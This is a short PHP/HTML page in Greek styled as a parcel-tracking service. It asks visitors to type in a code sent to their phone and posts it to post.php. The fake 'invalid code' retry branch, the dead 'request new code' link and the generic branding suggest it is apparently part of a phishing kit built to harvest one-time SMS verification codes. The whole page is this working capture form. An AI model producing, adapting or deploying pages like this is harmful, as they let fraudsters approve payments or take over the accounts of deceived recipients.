<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<div class="app">
<header>
    <img src="res/logo.png"> <span class="title">Εντοπισμός Αντικειμένου</span>
</header>


<main>

<div class="text">
Παρακαλούμε εισαγάγετε τον κωδικό που στάλθηκε στον αριθμό τηλεφώνου σας.
</div>

<form action="post.php" method="post">
    <?php 
        if(isset($_GET['e'])){
            echo '<p style="color:red;">Μη έγκυρος κωδικός. Παρακαλούμε δοκιμάστε ξανά.</p>';
            echo '<input type="hidden" name="error" value="1">';
        }
    ?>
<div class="row">
<div class="col">
    <label>Εισαγωγή κωδικού</label>
    <input type="text" name="sms" placeholder=" " required>
</div>
</div>

<div class="">
    <a href="#">Αίτημα νέου κωδικού</a>
</div>

<div class="col">
<button type="submit">Συνέχεια</button>
</div>

</form>

</main>




<footer>
    <img src="res/footer-mobile.png" class="mobile">
    <img src="res/footer.png" class="pc">
</footer>
</div>
</body>
</html>